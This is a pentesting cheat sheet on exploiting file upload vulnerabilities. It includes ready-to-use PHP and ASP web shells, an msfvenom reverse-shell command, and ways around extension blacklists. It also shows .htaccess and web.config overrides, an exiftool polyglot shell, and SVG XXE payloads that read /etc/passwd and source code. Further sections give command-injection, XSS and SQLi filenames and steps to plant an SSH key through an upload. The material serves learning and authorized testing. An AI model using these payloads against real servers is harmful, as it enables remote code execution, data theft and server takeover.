# File Upload Vulnerabilities

## **Introduction**

File upload vulnerabilities arise when a web server allows users to upload files to its filesystem without sufficiently validating them.

The ability to upload a malicious file can be an issue by itself, as attackers might upload dangerous data on the filesystem.\
In other cases, an attacker could potentially upload a server-side code file that functions as a web shell, effectively granting them full control over the server.

The impact of this class of vulnerabilities mostly depends on two factors:

1. Which part of the file is properly validated (e.g. its size, type, contents, ...)
2. Which restrictions are set on the file after it has effectively been uploaded

***

## How Web Servers handle file requests

Whenever a resource is requested, the web server parses the path in the request to identify the file extension. The server then uses this to determine the type of the file being requested, typically by comparing it to a list of preconfigured mappings between extensions and MIME types.\
What happens next depends on the file type and the server's configuration.

When requesting a **static file**, the server will most probably send the file's contents to the client within an HTTP response.

When requesting a **dynamic file**, there are two cases:

* If the server is configured to execute files of that type, it will assign variables based on the headers and parameters in the HTTP request before running the script. The resulting output may then be sent to the client in an HTTP response
* If the server is not configured to execute files of that type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text.

{% hint style="info" %}
Note:&#x20;

The Content-Type response header may provide clues as to what kind of file the server thinks it has served.

If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping.

_If you are lucky enough, you might edit your request's "Accept" header to ask for a specific response content-type, potentially allowing you to still gain code execution!_
{% endhint %}

***

## **File Types and Related Attacks**

| File Types              | Potential Attack |
| ----------------------- | ---------------- |
| HTML, JS, SVG, GIF      | XSS              |
| XML, SVG, PDF, PPT, DOC | XXE/SSRF         |
| ZIP, JPG, PNG           | DoS              |

***

## **Web and Reverse Shells Payloads to Inject**

<table><thead><tr><th width="477">Web Shell</th><th>Description</th></tr></thead><tbody><tr><td><code>&#x3C;?php file_get_contents('/etc/passwd'); ?></code></td><td>Basic PHP File Read</td></tr><tr><td><code>&#x3C;?php system('hostname'); ?></code></td><td>Basic PHP Command Execution</td></tr><tr><td><code>&#x3C;?php system($_GET['cmd']); ?></code></td><td>Basic PHP Web Shell</td></tr><tr><td><code>&#x3C;% eval request('cmd') %></code></td><td>Basic ASP Web Shell</td></tr><tr><td><code>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php</code></td><td>Generate PHP reverse shell</td></tr><tr><td>https://github.com/Arrexel/phpbash</td><td>PHP Web Shell</td></tr><tr><td>https://github.com/pentestmonkey/php-reverse-shell</td><td>PHP Reverse Shell</td></tr><tr><td>https://github.com/danielmiessler/SecLists/tree/master/Web-Shells</td><td>List of Web Shells and Reverse Shells</td></tr></tbody></table>

***

## **Extension Blacklist Bypasses**

One of the more obvious ways of preventing users from uploading malicious scripts is to blacklist potentially dangerous file extensions like `.php`

You might use the following techniques to bypass some basic extension blacklists:

| Command                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Description                                                   |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
| `shell.phtml`                                                                                                                                                                                                                                                                                                                                                                                                                                                        | Uncommon Extension                                            |
| `shell.pHp`                                                                                                                                                                                                                                                                                                                                                                                                                                                          | Case Manipulation                                             |
| `shell.jpg.php`                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Double Extension                                              |
| `shell.php.jpg`                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Reverse Double Extension                                      |
| `%20, %0a, %00, %0d0a, /, .\, ., …`                                                                                                                                                                                                                                                                                                                                                                                                                                  | Character Injection - Before/After Extension                  |
| <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst">List of PHP Extensions</a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP">List of ASP Extensions</a></p><p><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt">List of Web Extensions</a></p> | Use some alternative extensions that might not be blacklisted |

### **Overriding the server's configuration files**

In some cases, you might be able to leverage a file upload vulnerablity to move inside the filesystem and override files.\
In that case, you can override the server's configuration to allow certain extensions, such as `.php`

<details>

<summary>Apache Servers</summary>

When dealing with Apache servers, you can write the following directives to the `/etc/apache2/apache2.conf` file:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
    AddType application/x-httpd-php .php
```

Alternatively, you can also override the `.htaccess` file to write the configuration _for specific directories_.

_<mark style="color:blue;">**Info:**</mark> .htaccess files provide a way to make configuration changes on a per-directory basis. The directives in this file apply to the directory where the file is uploaded and its subdirectories._

If the file upload functionality has blacklisted all php extensions, you can upload a php webshell using the `.anything` extension. Then, upload a `.htaccess` file containing the following:

```
AddType application/x-httpd-php .anything
```

You will now be able to access the `webshell.anything` file and gain a PHP webshell!

_<mark style="color:red;">**Notice:**</mark> you will most probably not be able to access the .htaccess file from the webserver, as direct access to it is typically disabled by the web server_



</details>

<details>

<summary>IIS Servers</summary>

You can make directory-specific configuration on IIS servers using a `web.config` file.

For example, in order to enable JSON files to be served to users, you can add the following directives to the previously mentioned file:

```
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json"/>
</staticContent>
```

You may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type.

</details>

***

## **Content/Type and Mime/Type Bypass**

Modern servers may verify that the contents of the file actually match what is expected.

For example, some properties of specific types of files might be checked: uploading a PHP file when an image is expected might fail because the web server is checking for the dimensions (length and width) of the file, which are not properties of a PHP file, causing the validation mechanism to deny the file upload.

In some other cases, the file's signature (or magic bytes) are checked during the file upload procedure.&#x20;

{% hint style="success" %}
A file's signature can be used like a fingerprint or signature to determine whether the contents match the expected type.

For example, JPEG files begin with the bytes `FF D8 FF`.

Check this link for reference:

[List of File Signatures/Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
{% endhint %}

Using an image file upload as an example, you might be able to upload a php webshell using a **polygot** **JPEG** file containing the payload in its metadata

{% hint style="info" %}
A polyglot file is a single file that can be interpreted in multiple valid formats, depending on the program or context used to open it.

These files are crafted to contain data for different file types in such a way that various applications can read or interpret it as different formats.
{% endhint %}

To do that, you can use tools such as `ExifTool` to add the payload, for example, in the image's comment metadata section:

```
exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg -o polyglot.php
```

This will craft a file named `polyglot.php` which has the contents of a `JPG` file.

If the web server check the file's contents to ensure it is a JPG file, this will bypass such restriction. Otherwise, you will need to add extra work on this payload.

***

## **Exploiting File Upload Race Conditions**

Some websites' file upload functionalities allow the uploaded file to be uploaded on the filesystem and then remove it if it doesn't pass some validation checks. This kind of behaviour is typical in websites that rely on **anti-virus software and the like to check for malware**.

This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it.

{% hint style="success" %}
Notice that, if the file is loaded into a temporary directory with a randomized name, it could still be possible for an attacker to exploit a race condition: an example is when the random name is generated using pseudo-random functions like PHP's `uniqid()`,  which could be brute-forced.&#x20;
{% endhint %}

To make attacks like this easier, you can try to extend the amount of time taken to process the file, thereby lengthening the window for brute-forcing the directory name. To do that, you can upload a larger file. If it is processed in chunks, you can potentially take advantage of this by creating a malicious file with the payload at the start, followed by a large number of arbitrary padding bytes.

{% hint style="success" %}
You can check whether a potential file upload race condition is in place by uploading an EICAR file, which is a standard anti-malware test file. If the file is uploaded and deleted from the file system, then it could be possible that an anti-malware check is in place, allowing you to have a short time frame to access your uploaded file.

You can download the EICAR file signature [here](https://www.eicar.org/download-anti-malware-testfile/)
{% endhint %}

***

## **File Uploads to XSS Attack**

There are different cases in which you can gain XSS from file uploads:

1. Uploading a HTML file containing a script in javascript
2. Uploading a HTML file containing a link to our server to steal the document cookie

Other cases:

1. Whenever an application shows an image's metadata after its upload, it is possible to inject a payload inside metadata parameters such as `comment` or `artist` by using `exiftool`:
   * `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg`
2. By using SVG images, it's possible to inject a payload with something like:
   * `<script type="text/javascript"> alert("window.origin");</script>`

***

## File Upload to SSH Access

Suppose you have an Arbitrary File Upload vulnerability where you can also specify the uploaded file's location, whether via a vulnerable filename or a path parameter. Also suppose that you have write access on SSH's authorized\_keys file for a local user.

You can gain an SSH shell using the following:

1. Use `ssh-keygen` to generate a key named `fileup`
2. cat fileup > authorized\_keys
3. Upload the file to `/home/username/.ssh/authorized_keys` (or `/root/.ssh/authorized_keys`).
4. Note that  you might need to leverage a path traversal vulnerability to reach these destinations.
5. Use `ssh username@IP -i fileup` to gain the SSH shell as `username`
6. Notice that SSH might require using `chmod 500 fileup` to use the `-i fileup` option

***

## **File Uploads to XXE Attacks**

1.  \[Read `/etc/passwd`] XXE from SVG images upload by using the following payload:

    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <svg>&xxe;</svg>
    ```
2.  \[Exfiltrate PHP Code] XXE from SVG to read source code:

    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]> 
    <svg>&xxe;</svg>
    ```

***

## **Injections in File Names**

> * A common file upload attack uses a malicious string for the uploaded file name
> * The filename may get executed or processed if the uploaded file name is reflected on the page.
> * We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.
> * Some examples of filenames for this attack:

1. System Command Execution
   * `file$(whoami).jpg`
   * `file`whoami`.jpg`
   * `file.jpg||whoami`
2. XSS from filename:
   * `<script>alert(window.origin);</script>`
3. SQLi from filename:
   * `file';select+sleep(5);--.jpg`

***

## **Windows Specific Attacks**

1. **Reserved Characters:** such as (`|`, `<`, `>`, `*`, or `?`) are characters for special uses (such as wildcards).
   * If the web application doesn't apply any form of input sanification, it's possible to refer to a file different from the specified one (which does not exist)
   * This behaviour causes an error which may be shown on the web application, potentially showing the `upload directory`
2. **Windows Reserved Names:** can be used to replicate the same behaviour as the reserved characters previously shown. (`CON`, `COM1`, `LPT1`, or `NUL`)
3. **Windows Filename Convention:** it's possible to overwrite a file (or refer to a non-existant file) by using the `~` character to complete the filename
   * Example: `HAC~1.TXT` → may refer to hackthebox.txt
   * Reference: [https://en.wikipedia.org/wiki/8.3\_filename](https://en.wikipedia.org/wiki/8.3_filename)
